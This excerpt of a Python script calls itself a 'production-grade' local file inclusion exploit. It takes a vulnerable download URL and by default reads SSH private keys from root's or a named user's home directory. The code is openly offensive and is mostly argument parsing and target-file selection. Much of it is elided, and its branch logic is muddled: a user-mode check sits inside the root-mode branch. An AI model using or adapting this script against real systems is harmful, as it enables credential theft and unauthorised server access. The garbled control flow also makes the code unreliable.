...
def parse_args():
    parser = argparse.ArgumentParser(
        description="Production-grade LFI Exploitation Script for Dumping Credentials (root or user)"
    )
    parser.add_argument("-u", "--url", required=True,
                        help=("Full vulnerable endpoint URL. "
                              "Example: http://jhigufutsal.com:65432/download-pdf?filename="))
    parser.add_argument("--mode", choices=["root", "user"], default="root",
                        help="Mode to dump credentials. Use 'root' (default) or 'user'.")
    parser.add_argument("--username", help="Target username for user mode (e.g. john). Required if mode is user and --file is not provided.")
    parser.add_argument("--file", help=("File path to dump. If not provided, defaults to "
                                        "/root/.ssh/id_rsa in root mode and /home/<username>/.ssh/id_rsa in user mode."))
...
def main():
    ...
    # Determine the target file based on mode and provided options.
    if args.file:
        ...
        if args.mode == "root":
            ...
            if not args.username:
                logging.error("In user mode, --username is required if --file is not provided.")
                return
            target_file = f"/home/{args.username}/.ssh/id_rsa"
